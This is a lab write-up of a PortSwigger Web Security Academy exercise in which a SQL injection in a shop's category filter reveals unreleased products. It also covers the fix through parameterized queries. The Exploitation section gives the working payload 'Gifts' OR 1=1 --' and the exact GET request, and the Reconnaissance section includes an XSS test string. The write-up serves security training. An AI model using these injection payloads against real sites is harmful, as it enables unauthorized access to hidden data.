# SQL Injection in WHERE clause allowing retrieval of hidden data

|                |                                                                                                                                                    |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Author**     | foxploit                                                                                                                                           |
| **Platform**   | PortSwigger Web Security Academy                                                                                                                   |
| **Category**   | SQL Injection                                                                                                                                      |
| **Difficulty** | ⭐☆☆☆☆ (Apprentice)                                                                                                                                 |
| **Status**     | ✅ Solved                                                                                                                                           |
| **Lab URL**    | [portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) |

## Objective

Bypass the product filter to retrieve hidden/unreleased products via SQL injection in the `category` parameter.

## Reconnaissance

- Identified controllable parameters: `productId` and `category`.
- Tested `category=1 OR 1=1 --` → reflected without sanitization.
- Ruled out XSS: `<script>alert("1")</script>` printed as plain text, not executed — confirmed the vector was server-side SQL, not client-side.

## Exploitation

1. Crafted a payload accounting for the string context of the `category` parameter:

```
Gifts' OR 1=1 --
```

2. Sent the request:

```
GET /filter?category=Gifts'+OR+1=1+--+
```

3. Response included hidden/unreleased products — filter bypassed.

| Before                                              | After                                              |
| --------------------------------------------------- | -------------------------------------------------- |
| <img src="./screenshots/01-before.png" width="400"> | <img src="./screenshots/01-after.png" width="400"> |

**Payload applied:** `Gifts' OR 1=1 --`

## Impact

An attacker can bypass category/visibility restrictions to view unreleased products. In a production environment, the same injection point could be extended to extract data from other tables via `UNION SELECT`.

## Mitigation

- Use parameterized queries / prepared statements instead of concatenating user input into SQL.
- Apply server-side input validation as a defense-in-depth measure.

## Lesson Learned

- A single quote (`'`) terminates a SQL string literal — this is the injection point.
- `OR 1=1` is always true → bypasses the preceding `WHERE` condition.
- `--` comments out the rest of the original query, neutralizing anything after the payload.